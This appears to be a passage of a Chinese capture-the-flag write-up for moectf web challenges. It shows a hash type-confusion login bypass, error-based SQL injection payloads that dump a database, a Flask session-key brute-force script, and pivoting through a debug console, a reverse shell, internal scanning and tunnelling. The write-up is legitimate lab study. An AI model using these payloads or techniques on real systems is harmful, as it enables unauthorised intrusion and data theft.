class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> self.<span class="property">path</span> == <span class="string">&quot;/login&quot;</span>:</span><br><span class="line">                body = self.<span class="property">rfile</span>.<span class="title function_">read</span>(<span class="title function_">int</span>(self.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&quot;Content-Length&quot;</span>)))</span><br><span class="line">                payload = json.<span class="title function_">loads</span>(body)</span><br><span class="line">                params = json.<span class="title function_">loads</span>(<span class="title function_">decrypt</span>(payload[<span class="string">&quot;params&quot;</span>]))</span><br><span class="line">                <span class="title function_">print</span>(params)</span><br><span class="line">                <span class="keyword">if</span> params.<span class="title function_">get</span>(<span class="string">&quot;username&quot;</span>) == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">                    self.<span class="title function_">send_response</span>(<span class="number">403</span>)</span><br><span class="line">                    self.<span class="title function_">end_headers</span>()</span><br><span class="line">                    self.<span class="property">wfile</span>.<span class="title function_">write</span>(b<span class="string">&quot;YOU CANNOT LOGIN AS ADMIN!&quot;</span>)</span><br><span class="line">                    <span class="title function_">print</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">if</span> params.<span class="title function_">get</span>(<span class="string">&quot;username&quot;</span>) == params.<span class="title function_">get</span>(<span class="string">&quot;password&quot;</span>):</span><br><span class="line">                    self.<span class="title function_">send_response</span>(<span class="number">403</span>)</span><br><span class="line">                    self.<span class="title function_">end_headers</span>()</span><br><span class="line">                    self.<span class="property">wfile</span>.<span class="title function_">write</span>(b<span class="string">&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;</span>)</span><br><span class="line">                    <span class="title function_">print</span>(<span class="string">&quot;same&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                hashed = <span class="title function_">gethash</span>(params.<span class="title function_">get</span>(<span class="string">&quot;username&quot;</span>),params.<span class="title function_">get</span>(<span class="string">&quot;password&quot;</span>))</span><br><span class="line">                <span class="keyword">for</span> k,v <span class="keyword">in</span> hashed_users.<span class="title function_">items</span>():</span><br><span class="line">                    <span class="keyword">if</span> hashed == <span class="attr">v</span>:</span><br><span class="line">                        data = &#123;</span><br><span class="line">                            <span class="string">&quot;user&quot;</span>:k,</span><br><span class="line">                            <span class="string">&quot;hash&quot;</span>:hashed,</span><br><span class="line">                            <span class="string">&quot;flag&quot;</span>: <span class="variable constant_">FLAG</span> <span class="keyword">if</span> k == <span class="string">&quot;admin&quot;</span> <span class="keyword">else</span> <span class="string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        self.<span class="title function_">send_response</span>(<span class="number">200</span>)</span><br><span class="line">                        self.<span class="title function_">end_headers</span>()</span><br><span class="line">                        self.<span class="property">wfile</span>.<span class="title function_">write</span>(json.<span class="title function_">dumps</span>(data).<span class="title function_">encode</span>())</span><br><span class="line">                        <span class="title function_">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                self.<span class="title function_">send_response</span>(<span class="number">403</span>)</span><br><span class="line">                self.<span class="title function_">end_headers</span>()</span><br><span class="line">                self.<span class="property">wfile</span>.<span class="title function_">write</span>(b<span class="string">&quot;Invalid username or password&quot;</span>)</span><br></pre></td></tr></table></figure><p>确认了json里username和password不能相同后，经过一个hash函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">gethash</span>(*items):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> <span class="attr">items</span>:</span><br><span class="line">        <span class="keyword">if</span> item is <span class="title class_">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        c ^= int.<span class="title function_">from_bytes</span>(hashlib.<span class="title function_">md5</span>(f<span class="string">&quot;&#123;salt&#125;[&#123;item&#125;]&#123;salt&#125;&quot;</span>.<span class="title function_">encode</span>()).<span class="title function_">digest</span>(), <span class="string">&quot;big&quot;</span>) # it looks so complex! but is it safe enough?</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">hex</span>(c)[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure><p>这一坨处理是消除了类型限制，因此使用不同类型的username和password即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;1&quot;, &quot;password&quot;: 1&#125;</span><br></pre></td></tr></table></figure><p>经过decrypt函数的五次base64后post</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: localhost:59959</span><br><span class="line">Content-Length: 157</span><br><span class="line">sec-ch-ua: </span><br><span class="line">sec-ch-ua-platform: &quot;&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36</span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://localhost:59959</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: http://localhost:59959/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;params&quot;:&quot;VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJGNlJsWlZNV2gzVkZaRmQyTkVUbGhXYldoUVdsY3hVbVZWT1ZsaVIwWlNUVWR6ZVZVeFpIZFNiVlpXVFZSV1ZHRnRjems9&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692179475244-11f233f9-1301-45b6-aca4-1592f4ae426b.png" alt="img"></p><h1 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h1><p>抓包可以发现一个路由<code>wp-content/plugins/visitor-logging/logger.php</code></p><p>获得源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name: Visitor auto recorder</span></span><br><span class="line"><span class="comment">Description: Automatically record visitor&#x27;s identification, still in development, do not use in industry environment!</span></span><br><span class="line"><span class="comment">Author: KoKoMi</span></span><br><span class="line"><span class="comment">  Still in development! :)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不许偷看！这些代码我还在调试呢！</span></span><br><span class="line"><span class="title function_">highlight_file</span>(__FILE__);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载数据库配置，暂时用硬编码绝对路径</span></span><br><span class="line">require_once(<span class="string">&#x27;/var/www/html/wordpress/&#x27;</span> . <span class="string">&#x27;wp-config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$db_user = <span class="variable constant_">DB_USER</span>; <span class="comment">// 数据库用户名</span></span><br><span class="line">$db_password = <span class="variable constant_">DB_PASSWORD</span>; <span class="comment">// 数据库密码</span></span><br><span class="line">$db_name = <span class="variable constant_">DB_NAME</span>; <span class="comment">// 数据库名称</span></span><br><span class="line">$db_host = <span class="variable constant_">DB_HOST</span>; <span class="comment">// 数据库主机</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下</span></span><br><span class="line"><span class="comment">// 这些是临时的代码</span></span><br><span class="line"></span><br><span class="line">$ip = $_POST[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">$user_agent = $_POST[<span class="string">&#x27;user_agent&#x27;</span>];</span><br><span class="line">$time = <span class="title function_">stripslashes</span>($_POST[<span class="string">&#x27;time&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$mysqli = <span class="keyword">new</span> <span class="title function_">mysqli</span>($db_host, $db_user, $db_password, $db_name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> ($mysqli-&gt;connect_errno) &#123;</span><br><span class="line">    echo <span class="string">&#x27;数据库连接失败: &#x27;</span> . $mysqli-&gt;connect_error;</span><br><span class="line">    <span class="title function_">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$query = <span class="string">&quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&#x27;$ip&#x27;, &#x27;$user_agent&#x27;, $time)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行插入</span></span><br><span class="line">$result = <span class="title function_">mysqli_query</span>($mysqli, $query);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查插入是否成功</span></span><br><span class="line"><span class="keyword">if</span> ($result) &#123;</span><br><span class="line">    echo <span class="string">&#x27;数据插入成功&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&#x27;数据插入失败: &#x27;</span> . <span class="title function_">mysqli_error</span>($mysqli);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭数据库连接</span></span><br><span class="line"><span class="title function_">mysqli_close</span>($mysqli);</span><br><span class="line"></span><br><span class="line"><span class="comment">//gpt真好用</span></span><br></pre></td></tr></table></figure><p>time处可以进行sql注入</p><p>这里我用的是报错注入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> and <span class="title function_">extractvalue</span>(<span class="number">1</span>,<span class="title function_">concat</span>(<span class="number">0x7e</span>,<span class="title function_">user</span>(),<span class="number">0x7e</span>,<span class="title function_">database</span>()))</span><br><span class="line"><span class="number">1</span> and <span class="title function_">extractvalue</span>(<span class="number">1</span>,<span class="title function_">concat</span>(<span class="number">0x7e</span>,(select <span class="title function_">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.<span class="property">tables</span> where table_schema=<span class="title function_">database</span>())))</span><br><span class="line">#secret_of_kokomi,visitor_record 爆库</span><br><span class="line"><span class="number">1</span> and <span class="title function_">extractvalue</span>(<span class="number">1</span>,<span class="title function_">concat</span>(<span class="number">0x7e</span>,(select <span class="title function_">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.<span class="property">columns</span> where table_schema=<span class="title function_">database</span>() and table_name=<span class="string">&#x27;secret_of_kokomi&#x27;</span>)))</span><br><span class="line">#id,content 爆字段</span><br><span class="line"><span class="number">1</span> and <span class="title function_">extractvalue</span>(<span class="number">1</span>,<span class="title function_">concat</span>(<span class="number">0x7e</span>,(select <span class="title function_">group_concat</span>(id,content) <span class="keyword">from</span> secret_of_kokomi))) 爆内容</span><br><span class="line"><span class="number">1</span> and <span class="title function_">extractvalue</span>(<span class="number">1</span>,<span class="title function_">concat</span>(<span class="number">0x7e</span>,(<span class="title function_">mid</span>((select <span class="title function_">group_concat</span>(id,content) <span class="keyword">from</span> secret_of_kokomi),<span class="number">47</span>,<span class="number">70</span>))))</span><br><span class="line">适当拼接即可</span><br><span class="line">moectf&#123;<span class="title class_">Dig</span>_Thr0ugh_Eve2y_C0de</span><br><span class="line"><span class="title class_">Thr0</span>ugh_Eve2y_C0de_3nd_Poss1bIl</span><br><span class="line">e2y_C0de_3nd_Poss1bIlIti3s!!&#125;</span><br></pre></td></tr></table></figure><p>就是有一个问题这里报错注入最后flag显示不出来 要用mid函数去适当的调整 当时就是栽了跟头</p><p>还有一种就是直接<code>(user())</code>进行查询就行 。。。</p><h1 id="moworld"><a href="#moworld" class="headerlink" title="moworld"></a>moworld</h1><p>一道很综合考察内网渗透的题目 非常的不错 可以学到很多知识</p><p>压缩包密码为上一题的flag</p><p>首先是一个flask框架 给了提示需要我们去伪造session</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">记录一下搭建留言板的过程</span><br><span class="line">首先确定好web框架，笔者选择使用简单的flask框架。</span><br><span class="line">然后使用强且随机的字符串作为session的密钥。</span><br><span class="line">app.<span class="property">secret_key</span> = <span class="string">&quot;This-random-secretKey-you-can&#x27;t-get&quot;</span> + os.<span class="title function_">urandom</span>(<span class="number">2</span>).<span class="title function_">hex</span>()</span><br><span class="line">最后再写一下路由和数据库处理的函数就完成啦！！</span><br><span class="line">身为web手的我为了保护好服务器，写代码的时候十分谨慎，一定不会让有心人有可乘之机！</span><br></pre></td></tr></table></figure><p>可以看到session的构成 然后去网上找了下 发现是某次的美团CTF上的题目</p><p>直接拿来脚本用即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"># -*- <span class="attr">coding</span>: utf-<span class="number">8</span> -*-</span><br><span class="line"># @<span class="title class_">Time</span> : <span class="number">2022</span>/<span class="number">9</span>/<span class="number">17</span> <span class="number">9</span>:<span class="number">11</span></span><br><span class="line"># @<span class="title class_">Author</span> : pysnow</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"># standard imports</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"># <span class="title class_">Abstract</span> <span class="title class_">Base</span> <span class="title class_">Classes</span> (<span class="variable constant_">PEP</span> <span class="number">3119</span>)</span><br><span class="line"><span class="keyword">if</span> sys.<span class="property">version_info</span>[<span class="number">0</span>] &lt; <span class="number">3</span>:  # &lt; <span class="number">3.0</span></span><br><span class="line">    raise <span class="title class_">Exception</span>(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line">elif sys.<span class="property">version_info</span>[<span class="number">0</span>] == <span class="number">3</span> and sys.<span class="property">version_info</span>[<span class="number">1</span>] &lt; <span class="number">4</span>:  # &gt;= <span class="number">3.0</span> &amp;&amp; &lt; <span class="number">3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> <span class="title class_">ABCMeta</span>, abstractmethod</span><br><span class="line"><span class="attr">else</span>:  # &gt; <span class="number">3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> <span class="variable constant_">ABC</span>, abstractmethod</span><br><span class="line"></span><br><span class="line"># <span class="title class_">Lib</span> <span class="keyword">for</span> argument parsing</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"># external <span class="title class_">Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.<span class="property">sessions</span> <span class="keyword">import</span> <span class="title class_">SecureCookieSessionInterface</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(object):</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">__init__</span>(self, secret_key):</span><br><span class="line">        self.<span class="property">secret_key</span> = <span class="string">&quot;This-random-secretKey-you-can&#x27;t-get&quot;</span>+secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FSCM</span>(<span class="variable constant_">ABC</span>):</span><br><span class="line">    def <span class="title function_">encode</span>(secret_key, session_cookie_structure):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot; Encode a Flask session cookie &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="attr">try</span>:</span><br><span class="line">            app = <span class="title class_">MockApp</span>(secret_key)</span><br><span class="line"></span><br><span class="line">            session_cookie_structure = <span class="title function_">dict</span>(ast.<span class="title function_">literal_eval</span>(session_cookie_structure))</span><br><span class="line">            si = <span class="title class_">SecureCookieSessionInterface</span>()</span><br><span class="line">            s = si.<span class="title function_">get_signing_serializer</span>(app)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> s.<span class="title function_">dumps</span>(session_cookie_structure)</span><br><span class="line">        except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="title function_">format</span>(e)</span><br><span class="line">            raise e</span><br><span class="line"></span><br><span class="line">    def <span class="title function_">decode</span>(session_cookie_value, secret_key=<span class="title class_">None</span>):</span><br><span class="line">        <span class="string">&quot;&quot;</span><span class="string">&quot; Decode a Flask cookie  &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="attr">try</span>:</span><br><span class="line">            <span class="keyword">if</span> (secret_key == <span class="title class_">None</span>):</span><br><span class="line">                compressed = <span class="title class_">False</span></span><br><span class="line">                payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> payload.<span class="title function_">startswith</span>(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                    compressed = <span class="title class_">True</span></span><br><span class="line">                    payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                data = payload.<span class="title function_">split</span>(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                data = <span class="title function_">base64_decode</span>(data)</span><br><span class="line">                <span class="keyword">if</span> <span class="attr">compressed</span>:</span><br><span class="line">                    data = zlib.<span class="title function_">decompress</span>(data)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> data</span><br><span class="line">            <span class="attr">else</span>:</span><br><span class="line">                app = <span class="title class_">MockApp</span>(secret_key)</span><br><span class="line"></span><br><span class="line">                si = <span class="title class_">SecureCookieSessionInterface</span>()</span><br><span class="line">                s = si.<span class="title function_">get_signing_serializer</span>(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.<span class="title function_">loads</span>(session_cookie_value)</span><br><span class="line">        except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="title function_">format</span>(e)</span><br><span class="line">            raise e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="attr">dic</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="attr">dic</span>:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="attr">dic</span>:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> <span class="attr">dic</span>:</span><br><span class="line">                    key = i + j + k + l</span><br><span class="line">                    res = <span class="variable constant_">FSCM</span>.<span class="title function_">decode</span>(<span class="string">&#x27;eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6IjEyMyJ9.ZO9evg.Xms6P6EytB2HM4UvqW128bZDB-8&#x27;</span>, key)</span><br><span class="line">                    # <span class="title function_">print</span>(res)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">in</span> <span class="title function_">str</span>(res):</span><br><span class="line">                        <span class="title function_">print</span>(key)</span><br><span class="line">                        <span class="title function_">exit</span>()</span><br></pre></td></tr></table></figure><p>爆破出后四位 或者自己让gpt写一个字典慢慢跑都行</p><p>然后伪造session 可以看到提示</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">今天测试留言板的时候发现我的调试模式给出的pin码一直是<span class="number">904</span>-<span class="number">474</span>-<span class="number">531</span>不变，真是奇怪呢</span><br><span class="line">不过这个泄露了貌似很危险，别人就可以进我的<span class="variable language_">console</span>执行任意python代码了！</span><br><span class="line">一定不能泄露出去！！！！</span><br></pre></td></tr></table></figure><p>给了我们ping码 就可以知道它开启了debug模式</p><p>直接访问<code>/console</code>路由</p><p>进行反弹shell</p><p>获得第一段flag 再查看<code>/readme</code>并且得到提示</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">恭喜你通过外网渗透拿下了本台服务器的权限</span><br><span class="line">接下来，你需要尝试内网渗透，本服务器的/app/tools目录下内置了fscan</span><br><span class="line">你需要了解它的基本用法，然后扫描内网的ip段</span><br><span class="line">如果你进行了正确的操作，会得到类似下面的结果</span><br><span class="line"><span class="number">10.1</span><span class="number">.11</span><span class="number">.11</span>:<span class="number">22</span> open</span><br><span class="line"><span class="number">10.1</span><span class="number">.23</span><span class="number">.21</span>:<span class="number">8080</span> open</span><br><span class="line"><span class="number">10.1</span><span class="number">.23</span><span class="number">.23</span>:<span class="number">9000</span> open</span><br><span class="line">将你得到的若干个端口号从小到大排序并以 - 分割，这一串即为hint.<span class="property">zip</span>压缩包的密码（本例中，密码为：<span class="number">22</span>-<span class="number">8080</span>-<span class="number">9000</span>）</span><br><span class="line">注意：请忽略掉xx.<span class="property">xx</span>.<span class="property">xx</span><span class="number">.1</span>，例如扫出三个ip <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.2</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.3</span> ，请忽略掉有关<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>的所有结果！此为出题人服务器上的其它正常服务</span><br></pre></td></tr></table></figure><p><code>ifconfig</code> 命令没有 还可以用<code>hostname -I </code>获取存活的ip地址</p><p>可以得到两端 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693568306191-a3a36e21-6dd5-4b8d-8063-2176d62e53a2.png" alt="img"></p><p>然后进行fscan 扫描c段</p><p>获得密码<code>22-3306-6379-8080</code> 再将压缩包中flag解出 获得提示</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果</span><br><span class="line">可以看到，在本内网下还有另外两台服务器</span><br><span class="line">其中一台开启了<span class="number">22</span>(ssh)和<span class="number">6379</span>(redis)端口</span><br><span class="line">另一台开启了<span class="number">3306</span>(mysql)端口</span><br><span class="line">还有一台正是你访问到的留言板服务</span><br><span class="line">接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器</span><br><span class="line">此处可了解<span class="string">`nps`</span>和<span class="string">`frp`</span>，同样在/app/tools已内置了相应文件</span><br><span class="line">连接代理，推荐<span class="string">`proxychains`</span></span><br><span class="line">对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2</span><br><span class="line">对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3</span><br></pre></td></tr></table></figure><p>那么我们要去连接它内网下的其他服务器  我们就要进行内网穿透做隧道</p><p>首先就是用一台vps去连接跳板机 然后通过跳板机做隧道将内网中服务器暴露在公网中 这样我们就可以用我们的物理机去连接到了</p><p>大致就是 <code>172.21.0.2:xxxx(内网服务器)-&gt;跳板机ip:xxxxx-&gt;我们的vps&lt;-某种⼯具连接这个隧道&lt;-攻击机  </code></p><p>这里我用的是NPS</p><p>一开始我用的tcp隧道 就是我们可以直接去连接我的vps和指定隧道端口直接连接他的内网服务器</p><p>但是这里我并不能连接成功redis 就很奇怪</p><p>之后我用socks并且<code>proxifier</code>  做了个代理 就不用去用我的vps ip了 直接就是<code>127.0.20.x:3306</code>就可以连接到他的内网中mysql服务器 </p><p>配置什么的都要做好 包括容许走它的隧道应用等</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693569252355-b48b428a-f041-4125-ab6b-e5c3342fe830.png" alt="img"></p><p>连接上去之后 可以在表中发现第二段flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1693409847033-1ac482a8-1691-48f8-9e01-2d5064da6705.png" alt="img"></p><p>第三段是redis公钥登录服务器 